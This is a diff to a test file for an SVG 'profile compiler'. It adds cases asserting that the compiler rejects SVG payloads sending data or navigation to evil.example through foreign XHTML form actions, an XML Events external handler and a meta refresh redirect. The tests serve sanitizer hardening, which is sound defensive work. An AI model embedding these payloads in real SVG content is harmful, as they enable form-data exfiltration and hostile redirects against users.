@@ -354,6 +354,13 @@ describe("profile compiler", () => {
       // Unterminated image-set/url still fetch under CSS EOF error recovery.
       `<svg ${ns}><rect style="mask-image:image-set('https://evil.example/a.png' 1x"/></svg>`,
       `<svg ${ns}><rect style="filter:url(https://evil.example/f.svg"/></svg>`,
+      // Foreign form action/formaction submit to external endpoints.
+      `<svg ${ns} xmlns:h="http://www.w3.org/1999/xhtml"><h:form action="https://evil.example/collect"><h:button>Submit</h:button></h:form></svg>`,
+      `<svg ${ns} xmlns:h="http://www.w3.org/1999/xhtml"><h:form action="#ok"><h:button formaction="https://evil.example/collect">Go</h:button></h:form></svg>`,
+      // XML Events listener can load an external handler document.
+      `<svg ${ns} xmlns:ev="http://www.w3.org/2001/xml-events"><ev:listener event="load" handler="https://evil.example/events.svg#h"/></svg>`,
+      // Foreign meta refresh navigates without href/src.
+      `<svg ${ns} xmlns:h="http://www.w3.org/1999/xhtml"><h:meta http-equiv="refresh" content="0;url=https://evil.example/"/></svg>`,
     ];
     for (const payload of cases) {
       expect(() => compileProfile(validConfig, renderer(payload))).toThrow(
@@ -382,6 +389,15 @@ describe("profile compiler", () => {
       compileProfile(
         validConfig,
         renderer(`<svg ${ns}><a href="#safe" ping="#audit"/></svg>`),
+      ),
+    ).not.toThrow();
+    // Fragment-only form action stays allowed (no outbound submit).
+    expect(() =>
+      compileProfile(
+        validConfig,
+        renderer(
+          `<svg ${ns} xmlns:h="http://www.w3.org/1999/xhtml"><h:form action="#local"><h:button>Go</h:button></h:form></svg>`,
+        ),
       ),
     ).not.toThrow();
     // DOCTYPE-like text inside comments must not fail compilation.
